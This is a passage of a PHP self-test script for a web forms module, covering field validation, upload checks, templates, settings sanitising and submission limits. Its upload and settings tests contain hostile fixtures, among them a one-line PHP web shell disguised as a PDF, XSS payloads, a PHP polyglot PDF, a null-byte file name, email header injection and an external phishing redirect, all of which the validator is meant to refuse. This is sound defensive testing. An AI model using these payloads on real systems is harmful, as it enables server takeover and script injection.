check('error_pages names the page of the first error (in page order)', !$r['ok'] && $r['error_pages'] === ['pgtwo']);
$r = $val($vd, array_replace($in, ['f_fname' => str_repeat('a', 200)]), [], ['settings' => ['consent' => ['required' => true]]]);
check('form-level consent: required box missing is reported under _consent', !$r['ok'] && isset($r['errors']['_consent']));
$r = $val($vd, array_replace($in, ['form_consent' => 'on']), [], ['settings' => ['consent' => ['required' => true]]]);
check('form-level consent: ticked passes and sets consent_at', $r['ok'] && $r['consent_at'] !== null, json_encode($r['errors']));
$tpl = $mkDef([['textarea', 'big', 'Big', ['validation' => ['max_length' => 8000]]]]);
$r = $val($tpl, ['f_fbig' => str_repeat('z', 8001)]);
check('long text above its maximum is refused', !$r['ok']);
$tp2 = $mkDef(array_map(static fn($i) => ['textarea', 'q' . $i, 'Q' . $i, ['validation' => ['max_length' => 8000]]], range(1, 40)));
$in2 = [];
foreach (range(1, 40) as $i) {
    $in2['f_fq' . $i] = str_repeat('a', 7900);
}
$r = $val($tp2, $in2);
check('whole-submission size cap (256 KB): 40 x 7.9 KB answers refused with a form-level error', !$r['ok'] && isset($r['errors']['_form']));

echo "Forms: file rules\n";
// ------------------------------------------------------------------------------------------------------------------------------------ files
$fd = $mkDef([['file', 'cv', 'CV', ['required' => true, 'file' => ['types' => ['pdf', 'docx', 'png'], 'max_mb' => 1, 'max_files' => 2]]]]);
$okPdf = $mkTmp($pdfBytes('CV'));
$okPng = $mkTmp($pngBytes);
$okDocx = $mkTmp($zipParts(['[Content_Types].xml' => '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>', 'word/document.xml' => '<w:document/>']));
$r = $val($fd, [], ['fcv' => [$upload($okPdf, 'My CV.pdf')]]);
check('file: a real PDF passes, the name is cleaned, bytes untouched', $r['ok'] && $r['values']['fcv'] === ['My CV.pdf'] && count($r['files']['fcv']) === 1, json_encode($r['errors']));
$r = $val($fd, [], ['fcv' => [$upload($okPng, 'photo.PNG')]]);
check('file: a real PNG passes (extension check is case-insensitive)', $r['ok'], json_encode($r['errors']));
$r = $val($fd, [], ['fcv' => [$upload($okDocx, 'letter.docx')]]);
check('file: an Office-package DOCX passes', $r['ok'], json_encode($r['errors']));
$r = $val($fd, [], []);
check('file: required and missing -> error', !$r['ok'] && isset($r['errors']['fcv']));
$r = $val($fd, [], ['fcv' => [$upload($okPdf, 'a.pdf'), $upload($okPdf, 'b.pdf'), $upload($okPdf, 'c.pdf')]]);
check('file: more than max_files refused', !$r['ok'] && stripos($r['errors']['fcv'], 'up to 2') !== false, json_encode($r['errors']));
$hostile = [
    'PHP renamed to .pdf'                => [$mkTmp("<?php system(\$_GET['c']); ?>"), 'shell.pdf'],
    'HTML renamed to .pdf'               => [$mkTmp('<html><script>alert(1)</script></html>'), 'x.pdf'],
    'double extension .php.pdf'          => [$okPdf, 'cv.php.pdf'],
    'double extension .pdf.exe'          => [$okPdf, 'cv.pdf.exe'],
    'real PDF with the wrong extension'  => [$okPdf, 'cv.docx'],
    'extension not allowed (.svg)'       => [$mkTmp('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'), 'logo.svg'],
    'executable bytes as .png'           => [$mkTmp("MZ\x90\x00" . str_repeat("\0", 200)), 'a.png'],
    'PDF with JavaScript'                => [$mkTmp(str_replace('/Type /Catalog', '/Type /Catalog /OpenAction << /S /JavaScript /JS (app.alert(1)) >>', $pdfBytes('X'))), 'js.pdf'],
    'polyglot: PDF header + php payload' => [$mkTmp(str_replace('%%EOF', "<?php echo 1; ?>\n%%EOF", $pdfBytes('X'))), 'poly.pdf'],
    'ZIP that is not an Office package'  => [$mkTmp($zipBytes('readme.txt', 'hi')), 'fake.docx'],
    'macro-enabled package'              => [$mkTmp($zipBytes('word/vbaProject.bin', 'x')), 'macro.docx'],
    'empty file'                         => [$mkTmp(''), 'empty.pdf'],
    'no extension'                       => [$okPdf, 'resume'],
    'null byte in the name'              => [$okPdf, "cv.pdf\0.php"],
    'truncated PDF (no %%EOF)'           => [$mkTmp(substr($pdfBytes('X'), 0, 200)), 'cut.pdf'],
    'text file as .png'                  => [$mkTmp('just some text'), 'a.png'],
];
foreach ($hostile as $label => [$path, $name]) {
    $r = $val($fd, [], ['fcv' => [$upload($path, $name)]]);
    check('file refused: ' . $label, !$r['ok'] && isset($r['errors']['fcv']) && $r['files'] === [], json_encode($r['errors']));
}
$big = $mkTmp($pdfBytes('big') . str_repeat(' ', 1100000));
$r = $val($fd, [], ['fcv' => [$upload($big, 'big.pdf')]]);
check('file refused: larger than the field limit (1 MB)', !$r['ok'] && stripos($r['errors']['fcv'], 'too large') !== false, json_encode($r['errors']));
$r = $val($fd, [], ['fcv' => [['name' => 'a.pdf', 'tmp_name' => $okPdf, 'error' => UPLOAD_ERR_INI_SIZE, 'size' => 0]]]);
check('file refused: PHP upload error (INI_SIZE) gives a friendly size message', !$r['ok'] && stripos($r['errors']['fcv'], 'too large') !== false);
$r = $val($fd, [], ['fcv' => [$upload($okPdf, 'ok.pdf')]], ['inspect_files' => false]);
check('test-submit mode (inspect_files=false) checks name, type and size without reading the bytes', $r['ok']);
$stored = FormFileStore::store($upload($okPdf, "Jane's CV (final) <1>.pdf"), ['types' => ['pdf'], 'max_mb' => 1]);
$abs = STORAGE_PATH . '/private/' . $stored['path'];
check('store(): private path forms/YYYY/MM/<32 hex>.pdf, random name, original name cleaned, file exists and is not world-readable by name', is_file($abs) && FormFileStore::validPath($stored['path']) && preg_match('~^forms/\d{4}/\d{2}/[a-f0-9]{32}\.pdf$~', $stored['path']) === 1 && !str_contains($stored['name'], '<') && str_ends_with($stored['name'], '.pdf'), json_encode($stored));
check('store(): web server can never serve it (inside storage/, which is denied)', str_starts_with(str_replace('\\', '/', $abs), str_replace('\\', '/', STORAGE_PATH)) && is_file(STORAGE_PATH . '/.htaccess'));
$storedPng = FormFileStore::store($upload($okPng, 'x.png'), ['types' => ['png'], 'max_mb' => 1]);
check('store(): a picture is re-written (metadata scrubbed) and still a valid PNG', @getimagesize(STORAGE_PATH . '/private/' . $storedPng['path']) !== false);
FormFileStore::delete($stored['path']);
FormFileStore::delete($storedPng['path']);
check('delete(): removes the file; paths outside forms/ and traversal are ignored', !is_file($abs) && FormFileStore::delete('../app/config/app.php') === false && FormFileStore::delete('cv/2026/10/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.pdf') === false && is_file(APP_PATH . '/config/app.php'));
$thrown = false;
try {
    FormFileStore::storeAll(['fa' => [$upload($okPdf, 'a.pdf'), $upload($mkTmp('junk'), 'b.pdf')]], ['fa' => ['types' => ['pdf'], 'max_mb' => 1]]);
} catch (UploadException) {
    $thrown = true;
}
$leftover = array_filter(FormRetention::orphanFiles(false, 0), static fn(string $p): bool => true);
check('storeAll(): all or nothing - when the second file is bad, the first stored file is deleted again', $thrown && $leftover === [], json_encode($leftover));

echo "Forms: templates\n";
// ------------------------------------------------------------------------------------------------------------------------------------ templates
check('nine templates exist with the documented keys', FormTemplates::keys() === ['job_application', 'volunteer_registration', 'event_rsvp', 'contact_enquiry', 'partnership_enquiry', 'feedback_survey', 'scholarship_application', 'beneficiary_intake', 'training_registration']);
foreach (FormTemplates::keys() as $key) {
    $t = FormTemplates::get($key);
    $chk = FormDefinition::publishChecklist($t['definition'], $t['settings'], ['slug' => 'x']);
    $errs = array_filter($chk, static fn(array $c): bool => $c['level'] === 'error');
    $again = FormDefinition::normalise($t['definition']);
    check('template ' . $key . ': valid, stable under normalise(), no publish blockers', $again['ok'] && $again['definition'] === $t['definition'] && $errs === [], json_encode(array_values($errs)));
    $inst = FormTemplates::instantiate($key);
    $ids = array_column(FormDefinition::fields($inst['definition']), 'id');
    check('template ' . $key . ': instantiate() gives fresh unique ids and the conditions follow', count(array_unique($ids)) === count($ids) && array_intersect($ids, array_column(FormDefinition::fields($t['definition']), 'id')) === [] && array_column(FormDefinition::publishChecklist($inst['definition'], $inst['settings'], ['slug' => 'x']), 'code') === array_column($chk, 'code') && ($inst['settings']['confirmation']['email_field'] === '' || in_array($inst['settings']['confirmation']['email_field'], $ids, true)));
}
$jt = FormTemplates::get('job_application');
$jk = array_column(FormDefinition::fields($jt['definition']), 'type', 'key');
check('job template has name, e-mail, phone, location, CV upload, cover letter, profile link, availability, referees and consent; job status labels say Hired', $jk['full_name'] === 'text' && $jk['email'] === 'email' && $jk['phone'] === 'phone' && $jk['location'] === 'text' && $jk['cv'] === 'file' && $jk['cover_letter'] === 'textarea' && isset($jk['profile_link'], $jk['availability'], $jk['referees']) && $jk['consent'] === 'consent' && FormSettings::statusLabels($jt['settings'])['accepted'] === 'Hired' && $jt['settings']['seo']['noindex'] === true);
check('intake / job templates default to noindex, surveys are indexable', FormTemplates::get('beneficiary_intake')['settings']['seo']['noindex'] === true && FormTemplates::get('feedback_survey')['settings']['seo']['noindex'] === false);

echo "Forms: checklist, settings\n";
// ------------------------------------------------------------------------------------------------------------------------------------ checklist + settings
$ck = static fn(array $def, array $cfg = [], array $meta = []): array => array_column(FormDefinition::publishChecklist($def, $cfg, $meta), 'code');
check('checklist: an empty form is not ready', in_array('no_fields', $ck(FormDefinition::blank()), true));
$d = $mkDef([['text', 'a', 'A'], ['text', 'b', ''], ['select', 'c', 'C', ['options' => []]], ['text', 'dup', 'A'], ['text', 'r', 'R', ['validation' => ['min_length' => 9, 'max_length' => 3]]], ['number', 'n', 'N', ['validation' => ['min' => 10, 'max' => 5]]]]);
$codes = $ck($d);
check('checklist: empty label, empty options, duplicate label, bad ranges are found', in_array('empty_label', $codes, true) && in_array('empty_options', $codes, true) && in_array('duplicate_label', $codes, true) && count(array_keys($codes, 'range', true)) === 2, json_encode($codes));
$d = $mkDef([['text', 'a', 'A', ['logic' => ['match' => 'all', 'rules' => [['field' => 'fgone', 'op' => 'equals', 'value' => 'x']]]]], ['text', 'b', 'B', ['logic' => ['match' => 'all', 'rules' => [['field' => 'fb', 'op' => 'filled']]]]],
    ['text', 'c', 'C', ['logic' => ['match' => 'all', 'rules' => [['field' => 'fe', 'op' => 'contains', 'value' => '']]]]], ['text', 'e', 'E', ['logic' => ['match' => 'all', 'rules' => [['field' => 'fc', 'op' => 'filled']]]]]]);
$codes = $ck($d);
check('checklist: a condition on a missing field, on itself, without a value, and a circle are errors', substr_count(implode(',', $codes), 'dangling_condition') >= 2 && in_array('incomplete_condition', $codes, true) && in_array('condition_cycle', $codes, true), json_encode($codes));
$d = $mkDef([], [['id' => 'pgone', 'title' => 'One', 'fields' => [['id' => 'fk', 'key' => 'k', 'type' => 'text', 'label' => 'K']]], ['id' => 'pgtwo', 'title' => 'Two', 'logic' => ['match' => 'all', 'rules' => [['field' => 'fz', 'op' => 'filled']]], 'fields' => [['id' => 'fz', 'key' => 'z', 'type' => 'text', 'label' => 'Z']]]]);
check('checklist: a page cannot depend on a question on the same or a later page', in_array('condition_order', $ck($d), true));
$cfgOn = FormSettings::normalise(['confirmation' => ['enabled' => true, 'email_field' => 'fnone'], 'one_per_email' => true])['settings'];
$codes = $ck($mkDef([['text', 'a', 'A']]), $cfgOn);
check('checklist: confirmation without an e-mail question and one-per-email without e-mail are errors', in_array('confirmation_field', $codes, true) && in_array('one_per_email', $codes, true));
check('checklist: closing before opening is an error', in_array('dates', $ck($mkDef([['text', 'a', 'A']]), [], ['opens_at' => '2026-10-20 10:00:00', 'closes_at' => '2026-10-19 10:00:00']), true));
$st = FormSettings::normalise(['kind' => 'job', 'intro' => '<p onclick="x()">Hi</p><script>alert(1)</script>', 'success' => ['mode' => 'redirect', 'redirect_path' => 'https://evil.example/phish'], 'notify' => ['emails' => ['ok@example.org', 'not an email', "evil@x.org\r\nBcc: z@z.org"]],
    'theme' => ['accent' => 'purple', 'layout' => 'sideways'], 'spam' => 'ultra', 'retention_days' => 999999, 'status_labels' => ['accepted' => 'Engaged', 'bogus' => 'X', 'new' => 'New'], 'consent' => ['required' => 'on', 'text' => '<b>I agree</b>']]);
check('settings: unsafe intro HTML is sanitised', !str_contains($st['settings']['intro'], 'onclick') && !str_contains($st['settings']['intro'], 'script'), $st['settings']['intro']);
check('settings: an external redirect is refused; internal paths are accepted', isset($st['errors']['success.redirect_path']) && FormSettings::normalise(['success' => ['mode' => 'redirect', 'redirect_path' => '/thank-you']])['settings']['success']['redirect_path'] === '/thank-you' && isset(FormSettings::normalise(['success' => ['mode' => 'redirect', 'redirect_path' => '/admin/users']])['errors']['success.redirect_path']));
check('settings: invalid staff e-mail addresses (incl. header injection) are refused, valid kept', $st['settings']['notify']['emails'] === ['ok@example.org'] && count($st['errors']) >= 2, json_encode($st['errors']));
check('settings: unknown accent / layout / spam level fall back; retention is capped; only known status labels that differ are kept', $st['settings']['theme'] === ['accent' => 'orange', 'layout' => 'stepped', 'progress' => true] && $st['settings']['spam'] === 'standard' && $st['settings']['retention_days'] === 3650 && $st['settings']['status_labels'] === ['accepted' => 'Engaged'], json_encode($st['settings']['status_labels']));
check('settings: consent text loses tags; kind job gives noindex default', $st['settings']['consent'] === ['required' => true, 'text' => 'I agree'] && $st['settings']['seo']['noindex'] === true);
check('settings: JSON round trip and garbage tolerance', FormSettings::decode(FormSettings::encode($st['settings'])) === $st['settings'] && FormSettings::decode('not json')['kind'] === 'general' && FormSettings::decode(null)['notify']['include_answers'] === false);
check('settings: notification default is LINK ONLY (answers are not e-mailed unless switched on)', FormSettings::defaults()['notify']['include_answers'] === false);

echo "Forms: service, locking, status, availability\n";
// ------------------------------------------------------------------------------------------------------------------------------------ service
$created = FormService::create(['source' => 'volunteer_registration', 'title' => ZZ_FORMS . ' volunteer'], null);
$form = $created['form'];
$fid = (int) $form['id'];
check('create from a template: draft, version 1, slug from the title, template key remembered, settings from the template', $created['ok'] && $form['status'] === 'draft' && $form['version'] === 1 && $form['slug'] === 'zz-selftest-forms-volunteer' && $form['template_key'] === 'volunteer_registration' && $form['cfg']['confirmation']['enabled'] === true);
check('create: title required; unknown template refused; bad slug refused', !FormService::create(['source' => 'blank', 'title' => ''])['ok'] && !FormService::create(['source' => 'nope', 'title' => 'x'])['ok'] && !FormService::create(['source' => 'blank', 'title' => ZZ_FORMS . ' x', 'slug' => 'Admin!'])['ok']);
$blankForm = FormService::create(['source' => 'blank', 'title' => ZZ_FORMS . ' blank'])['form'];
check('create blank: one empty page', count($blankForm['def']['pages']) === 1 && $blankForm['def']['pages'][0]['fields'] === []);
foreach (['admin', 'forms', 'thanks', 'api', 'Hello_World', '', str_repeat('a', 101), 'a--b', '-a', 'a-'] as $s) {
    check('slug "' . substr($s, 0, 20) . '" is refused', FormService::slugProblem($s) !== null);
}
check('slug: taken slug refused, own slug fine when editing, uniqueSlug() avoids reserved words and collisions', FormService::slugProblem($form['slug']) !== null && FormService::slugProblem($form['slug'], $fid) === null && FormService::uniqueSlug(ZZ_FORMS . ' volunteer') === 'zz-selftest-forms-volunteer-2' && FormService::uniqueSlug('Admin') === 'admin-form' && FormService::uniqueSlug('???') === 'untitled-form');
$s1 = FormService::save($fid, ['title' => ZZ_FORMS . ' volunteer v2'], 1, null);
check('save: version goes 1 -> 2, title changed', $s1['ok'] && $s1['changed'] && $s1['form']['version'] === 2 && $s1['form']['title'] === ZZ_FORMS . ' volunteer v2');
$s2 = FormService::save($fid, ['title' => ZZ_FORMS . ' volunteer v2'], 2, null);
check('save: nothing changed keeps the version (autosave is cheap)', $s2['ok'] && $s2['changed'] === false && $s2['form']['version'] === 2);
$s3 = FormService::save($fid, ['title' => 'Stale'], 1, null);
check('save: a stale version is a CONFLICT that returns the newest form and does not overwrite', !$s3['ok'] && !empty($s3['conflict']) && $s3['form']['version'] === 2 && $s3['form']['title'] === ZZ_FORMS . ' volunteer v2' && $s3['current']['version'] === 2);
check('save: unknown id', !empty(FormService::save(999999999, [], 1)['not_found']));
$s4 = FormService::save($fid, ['definition' => ['pages' => [['fields' => [['type' => 'bogus']]]]], 'slug' => 'admin', 'opens_at' => 'yesterday', 'max_submissions' => '0'], 2, null);
check('save: invalid definition, reserved slug, bad date and bad maximum are reported together and NOTHING is saved', !$s4['ok'] && isset($s4['errors']['slug'], $s4['errors']['opens_at'], $s4['errors']['max_submissions']) && Form::find($fid)['version'] == 2);
$s5 = FormService::save($fid, ['opens_at' => '2026-10-20T09:00', 'closes_at' => '2026-10-19T09:00'], 2, null);
check('save: closing before opening refused', !$s5['ok'] && isset($s5['errors']['closes_at']));
$s6 = FormService::save($fid, ['settings' => ['notify' => ['emails' => ['bad']]]], 2, null);
check('save: invalid settings are refused as a whole (autosave must not drop a half-typed address silently)', !$s6['ok'] && isset($s6['errors']['settings.notify.emails.0']));
$s7 = FormService::save($fid, ['opens_at' => '2026-10-19T09:00', 'closes_at' => '2026-10-30T09:00', 'max_submissions' => '50', 'listed' => '1', 'description' => '<b>About</b>'], 2, null);
check('save: dates (datetime-local format), maximum, listed, description (plain text) stored; EAT strings', $s7['ok'] && $s7['form']['opens_at'] === '2026-10-19 09:00:00' && $s7['form']['closes_at'] === '2026-10-30 09:00:00' && $s7['form']['max_submissions'] === 50 && $s7['form']['listed'] === 1 && $s7['form']['description'] === 'About', json_encode($s7['errors'] ?? []));
FormService::save($fid, ['opens_at' => '', 'closes_at' => '', 'max_submissions' => ''], 3, null);
$form = FormService::find($fid);
check('save: empty dates and maximum clear them', $form['opens_at'] === null && $form['closes_at'] === null && $form['max_submissions'] === null);

// status machine
$t = FormService::transition($fid, 'close', null, null);
check('status: draft cannot be closed', !$t['ok']);
$t = FormService::transition($fid, 'publish', null, null);
$form = FormService::find($fid);
check('status: publish from draft (checklist has no errors) sets published_at and bumps the version', $t['ok'] && $form['status'] === 'published' && $form['published_at'] !== null && $form['version'] > 3);
$cfgBad = FormService::save($fid, ['definition' => ['pages' => [['fields' => []]]]], (int) $form['version'], null);
check('save: a LIVE form must stay complete - removing every question is refused (not_ready) and nothing changes', !$cfgBad['ok'] && !empty($cfgBad['not_ready']) && isset($cfgBad['errors']['no_fields']) && FormService::find($fid)['def'] === $form['def']);
$mid = FormService::save($fid, ['definition' => array_replace_recursive($form['def'], ['pages' => [0 => ['fields' => [0 => ['label' => 'Full name (edited)']]]]])], (int) $form['version'], null);
check('save: editing a live form works and the field id stays (answers stay readable)', $mid['ok'] && $mid['form']['def']['pages'][0]['fields'][0]['id'] === $form['def']['pages'][0]['fields'][0]['id'] && $mid['form']['def']['pages'][0]['fields'][0]['label'] === 'Full name (edited)');
$form = FormService::find($fid);
$t = FormService::transition($fid, 'close', (int) $form['version'] - 1, null);
check('status: a stale version on a transition is a conflict', !$t['ok'] && !empty($t['conflict']));
check('status: close, reopen, unpublish, archive, restore follow the machine', FormService::transition($fid, 'close')['ok'] && FormService::find($fid)['status'] === 'closed' && FormService::transition($fid, 'reopen')['ok'] && FormService::transition($fid, 'unpublish')['ok'] && FormService::find($fid)['status'] === 'draft'
    && FormService::transition($fid, 'archive')['ok'] && !FormService::transition($fid, 'publish')['ok'] && FormService::transition($fid, 'restore')['ok'] && FormService::find($fid)['status'] === 'draft' && !FormService::transition($fid, 'explode')['ok']);
$empty = FormService::transition((int) $blankForm['id'], 'publish');
check('status: publishing a form with errors is refused with the checklist', !$empty['ok'] && isset($empty['errors']['no_fields']) && $empty['checklist'] !== []);
FormService::transition($fid, 'publish');
$form = FormService::find($fid);
$dup = FormService::duplicate($fid, null);
check('duplicate: a new DRAFT "Copy of ...", not listed, no submissions, same questions and ids', $dup['ok'] && $dup['form']['status'] === 'draft' && str_starts_with($dup['form']['title'], 'Copy of ') && $dup['form']['listed'] === 0 && $dup['form']['submissions_count'] === 0 && $dup['form']['def'] === $form['def'] && $dup['form']['slug'] !== $form['slug']);
$zzDupId = (int) $dup['form']['id'];

$av = static fn(array $over): array => FormService::availability(array_replace($form, ['status' => 'published', 'opens_at' => null, 'closes_at' => null, 'max_submissions' => null, 'submissions_count' => 0], $over), new DateTimeImmutable('2026-10-19 12:00:00', FormService::tz()));
check('availability: draft / archived are not visible', $av(['status' => 'draft'])['state'] === 'draft' && !$av(['status' => 'draft'])['visible'] && $av(['status' => 'archived'])['state'] === 'archived' && !$av(['status' => 'archived'])['visible']);
check('availability: published and open', $av(['opens_at' => null, 'closes_at' => null, 'max_submissions' => null])['can_submit'] === true);
check('availability: before opens_at = not_open (visible, cannot submit)', ($x = $av(['opens_at' => '2026-10-20 08:00:00'])) && $x['state'] === 'not_open' && $x['visible'] && !$x['can_submit']);
check('availability: at or after closes_at = closed', $av(['closes_at' => '2026-10-19 12:00:00'])['state'] === 'closed' && $av(['closes_at' => '2026-10-19 11:59:59'])['state'] === 'closed' && $av(['closes_at' => '2026-10-19 12:00:01'])['state'] === 'open');
check('availability: maximum reached = full; remaining is reported', $av(['max_submissions' => 5, 'submissions_count' => 5])['state'] === 'full' && $av(['max_submissions' => 5, 'submissions_count' => 3])['remaining'] === 2);
check('availability: status closed wins', $av(['status' => 'closed'])['state'] === 'closed');
check('parseLocal: datetime-local, stored, date-only, invalid, empty', FormService::parseLocal('2026-10-19T14:30') === '2026-10-19 14:30:00' && FormService::parseLocal('2026-10-19 14:30:15') === '2026-10-19 14:30:15' && FormService::parseLocal('2026-10-19') === '2026-10-19 00:00:00' && FormService::parseLocal('2026-02-30T10:00') === false && FormService::parseLocal('') === null && FormService::parseLocal(['x']) === false && FormService::parseLocal('1999-01-01') === false);

echo "Forms: submissions\n";
// ------------------------------------------------------------------------------------------------------------------------------------ submissions
$form = FormService::find($fid);
$ids = [];
foreach (FormDefinition::fields($form['def']) as $f) {
    $ids[$f['key']] = $f['id'];
}
$answers = static fn(array $over = []): array => array_replace([
    'f_' . $ids['full_name'] => 'Amina Okello', 'f_' . $ids['email'] => 'Amina@Example.org', 'f_' . $ids['phone'] => '0700 123456', 'f_' . $ids['location'] => 'Gulu',
    'f_' . $ids['age_group'] => '18-24', 'f_' . $ids['interests'] => ['teaching-and-mentoring', 'events-and-outreach'], 'f_' . $ids['availability'] => ['weekends'],
    'f_' . $ids['hours'] => '3-to-5-hours', 'f_' . $ids['motivation'] => 'I want to help young people learn.', 'f_' . $ids['consent'] => '1',
], $over);
$submit = static function (array $form, array $in, array $files = [], array $meta = []) {
    $res = FormValidator::validate((array) $form['def'], $in, $files, ['settings' => $form['cfg']]);
    if (!$res['ok']) {
        return ['validation' => $res['errors']];
    }
    $rules = [];
    foreach (FormDefinition::inputFields($form['def']) as $f) {
        if ($f['type'] === 'file') {
            $rules[$f['id']] = $f['file'];
        }
    }
    $stored = FormFileStore::storeAll($res['files'], $rules);
    $out = SubmissionService::store($form, $res, $stored, $meta + ['ip' => '203.0.113.7', 'user_agent' => 'selftest']);
    if (!$out['ok']) {
        FormFileStore::deleteAll($stored);
    }
    return $out;
};
$o1 = $submit($form, $answers(), [], ['context' => ['type' => 'job', 'ref' => 'some-job', 'label' => 'Field Officer']]);
$sub = SubmissionService::find((int) $o1['id']);
check('store(): ok, reference F<form>-<id>, count +1, status new, e-mail lower-case, context and consent time stored', $o1['ok'] && $o1['reference'] === 'F' . $fid . '-' . $o1['id'] && $sub['status'] === 'new' && $sub['submitter_email'] === 'amina@example.org' && $sub['context_type'] === 'job' && $sub['context_label'] === 'Field Officer' && $sub['consent_at'] !== null && FormService::find($fid)['submissions_count'] === 1, json_encode($o1));
check('store(): IP is only a 64-hex keyed hash, user agent kept, no raw address anywhere in the row', preg_match('/^[a-f0-9]{64}$/', (string) $sub['ip_hash']) === 1 && $sub['user_agent'] === 'selftest' && !str_contains(json_encode($sub), '203.0.113.7'));
$byKey = array_column($sub['entries'], null, 'key');
check('snapshot: one entry per visible question with key, label, type, value and text', count($sub['entries']) === 11 && $byKey['full_name']['type'] === 'text' && $byKey['full_name']['text'] === 'Amina Okello' && $byKey['email']['value'] === 'amina@example.org', (string) count($sub['entries']));
check('snapshot: choice text uses option labels, phone is +E.164, checkboxes list', $byKey['interests']['text'] === 'Teaching and mentoring, Events and outreach' && $byKey['interests']['value'] === ['teaching-and-mentoring', 'events-and-outreach'] && $byKey['phone']['value'] === '+256700123456' && $byKey['age_group']['text'] === '18 to 24');
check('snapshot: hidden question (guardian, age 18-24) is NOT in the snapshot', !isset($byKey['guardian_name']) && !isset($byKey['guardian_phone']));
check('snapshot: consent entry carries the time it was given', ($byKey['consent']['value'] ?? '') === 'yes' && !empty($byKey['consent']['at']));
$search = Database::value('SELECT search_text FROM form_submissions WHERE id = ?', [(int) $o1['id']]);
check('search_text: plain text of the answers (and the context), no JSON, no markup', str_contains($search, 'Amina Okello') && str_contains($search, 'Teaching and mentoring, Events and outreach') && str_contains($search, 'Field Officer') && !str_contains($search, '{"'));
// editing the form afterwards must not change history
$edit = FormService::save($fid, ['definition' => array_replace_recursive($form['def'], ['pages' => [0 => ['fields' => [0 => ['label' => 'Renamed question']]]]])], (int) FormService::find($fid)['version'], null);
$sub2 = SubmissionService::find((int) $o1['id']);
check('history: renaming a question later does not change the stored answers (snapshot)', $edit['ok'] && array_column($sub2['entries'], null, 'key')['full_name']['label'] === $byKey['full_name']['label']);
$bad = $submit($form, $answers(['f_' . $ids['email'] => 'nope']));
check('an invalid submission stores nothing', isset($bad['validation']) && FormService::find($fid)['submissions_count'] === 1);

// one per e-mail
FormService::save($fid, ['settings' => ['notify' => ['enabled' => true], 'one_per_email' => true] + $form['cfg']], (int) FormService::find($fid)['version'], null);
$form = FormService::find($fid);
$dupSub = $submit($form, $answers(['f_' . $ids['email'] => 'AMINA@example.org']));
check('one submission per e-mail: the same address (any case) is refused, the e-mail question is named', !$dupSub['ok'] && $dupSub['error'] === 'duplicate' && $dupSub['field'] === $ids['email'], json_encode($dupSub));
$other = $submit($form, $answers(['f_' . $ids['email'] => 'bea@example.org']));
check('one submission per e-mail: a different address is accepted', $other['ok']);
Database::execute("UPDATE form_submissions SET status = 'spam' WHERE id = ?", [(int) $other['id']]);
$again = $submit($form, $answers(['f_' . $ids['email'] => 'bea@example.org']));
check('one submission per e-mail: a submission marked spam does not block the address', $again['ok']);

// maximum + status/dates re-checked inside the transaction
FormService::save($fid, ['max_submissions' => '4'], (int) FormService::find($fid)['version'], null);
$form = FormService::find($fid);
$cnt = (int) Database::value("SELECT COUNT(*) FROM form_submissions WHERE form_id = ? AND status <> 'spam'", [$fid]);
$res = [];
for ($i = 0; $i < 4; $i++) {
    $res[] = $submit($form, $answers(['f_' . $ids['email'] => 'max' . $i . '@example.org']));
}
$okCount = count(array_filter($res, static fn($r) => !empty($r['ok'])));
check('maximum: only the free places are taken (spam does not count), the rest are told "full"', $okCount === 4 - $cnt && $res[3]['error'] === 'full', json_encode(array_map(static fn($r) => $r['error'] ?? 'ok', $res)));
Database::execute("UPDATE forms SET status = 'closed' WHERE id = ?", [$fid]);
$closed = $submit(FormService::find($fid), $answers(['f_' . $ids['email'] => 'late@example.org']), [], []);
check('store() re-checks the status under the lock: a form closed meanwhile refuses the submission', !$closed['ok'] && $closed['error'] === 'closed');
Database::execute("UPDATE forms SET status = 'published', max_submissions = NULL WHERE id = ?", [$fid]);

// race: parallel PHP processes take the last places
Database::execute('UPDATE forms SET max_submissions = ? WHERE id = ?', [(int) Database::value('SELECT COUNT(*) FROM form_submissions WHERE form_id = ? AND status <> \'spam\'', [$fid]) + 3, $fid]);
$script = tempnam(sys_get_temp_dir(), 'zzr') ?: '';
$zzTmp[] = $script;
file_put_contents($script, '<?php require ' . var_export(dirname(__DIR__) . '/app/bootstrap.php', true) . ';
use App\Services\Forms\{FormService, FormValidator, SubmissionService};
$form = FormService::find((int) $argv[1]); $ids = []; foreach (\App\Services\Forms\FormDefinition::fields($form["def"]) as $f) { $ids[$f["key"]] = $f["id"]; }
$in = ["f_".$ids["full_name"] => "Racer ".$argv[2], "f_".$ids["email"] => "race".$argv[2]."@example.org", "f_".$ids["phone"] => "0700123456", "f_".$ids["location"] => "X", "f_".$ids["age_group"] => "18-24",
  "f_".$ids["interests"] => ["events-and-outreach"], "f_".$ids["availability"] => ["weekends"], "f_".$ids["motivation"] => "go", "f_".$ids["consent"] => "1"];
while (microtime(true) < (float) $argv[3]) { usleep(500); }
$r = FormValidator::validate($form["def"], $in, [], []);
$o = SubmissionService::store($form, $r, [], ["ip" => "198.51.100.1"]);
echo $o["ok"] ? "OK" : "NO:".($o["error"] ?? "?");');
$go = microtime(true) + 1.5;
$procs = [];
$php = PHP_BINARY;
for ($i = 0; $i < 7; $i++) {
    $p = proc_open([$php, $script, (string) $fid, (string) $i, (string) $go], [1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes);
    if (is_resource($p)) {
        $procs[] = [$p, $pipes];
    }
}
$outs = [];
foreach ($procs as [$p, $pipes]) {
    $outs[] = trim((string) stream_get_contents($pipes[1]));
    stream_get_contents($pipes[2]);
    proc_close($p);
}
$won = count(array_filter($outs, static fn($o) => $o === 'OK'));
$left = (int) Database::value("SELECT max_submissions - (SELECT COUNT(*) FROM form_submissions WHERE form_id = ? AND status <> 'spam') FROM forms WHERE id = ?", [$fid, $fid]);
check('RACE: 7 parallel PHP processes compete for 3 free places: exactly 3 win, the others get "full", the maximum is never exceeded', count($procs) === 7 && $won === 3 && $left === 0, json_encode($outs) . ' left=' . $left);
SubmissionService::recount($fid);
check('recount(): submissions_count equals the rows that count (spam does not)', FormService::find($fid)['submissions_count'] === (int) Database::value("SELECT COUNT(*) FROM form_submissions WHERE form_id = ? AND status <> 'spam'", [$fid]));
Database::execute('UPDATE forms SET max_submissions = NULL WHERE id = ?', [$fid]);

// status workflow, notes, search
$any = (int) Database::value("SELECT id FROM form_submissions WHERE form_id = ? AND status = 'new' ORDER BY id LIMIT 1", [$fid]);
